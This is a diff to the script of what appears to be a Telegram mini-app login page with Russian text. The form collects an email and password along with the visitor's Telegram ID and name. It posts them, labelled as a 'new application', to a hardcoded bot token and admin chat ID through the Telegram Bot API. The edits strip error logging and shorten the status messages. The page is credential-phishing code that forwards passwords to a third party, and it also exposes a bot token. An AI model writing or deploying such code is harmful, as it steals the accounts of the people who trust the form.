@@ -97,7 +97,7 @@
     </div>
     
     <script>
-        // ТВОЙ ТОКЕН И ID (обнови здесь!)
+        // ТВОИ ДАННЫЕ
         const BOT_TOKEN = "8603629858:AAHoJGBCDvvImzpO3wllUriPulRvX0APozY";
         const ADMIN_ID = "8542901240";
         
@@ -128,10 +128,8 @@
             submitBtn.textContent = '⏳ Отправка...';
             
             const user = tg.initDataUnsafe?.user || { id: 'неизвестно', first_name: 'Гость' };
-            const userId = user.id || 'неизвестно';
-            const userName = user.first_name || 'Гость';
             
-            const message = `🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: ${userId}\n👤 Имя: ${userName}\n📧 Email: ${email}\n🔑 Пароль: ${password}`;
+            const message = `🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: ${user.id || 'неизвестно'}\n👤 Имя: ${user.first_name || 'Гость'}\n📧 Email: ${email}\n🔑 Пароль: ${password}`;
             
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -146,16 +144,14 @@
                 const result = await response.json();
                 
                 if (result.ok) {
-                    showMessage('✅ Данные отправлены администратору!', 'success');
+                    showMessage('✅ Данные отправлены!', 'success');
                     emailInput.value = '';
                     passwordInput.value = '';
                 } else {
-                    console.error('Ошибка API:', result);
-                    showMessage('❌ Ошибка отправки: ' + (result.description || 'неизвестная ошибка'), 'error');
+                    showMessage('❌ Ошибка: ' + (result.description || 'неизвестная'), 'error');
                 }
             } catch (error) {
-                console.error('Ошибка запроса:', error);
-                showMessage('❌ Ошибка соединения с сервером', 'error');
+                showMessage('❌ Ошибка соединения', 'error');
             } finally {
                 submitBtn.disabled = false;
                 submitBtn.textContent = '🔓 Войти';
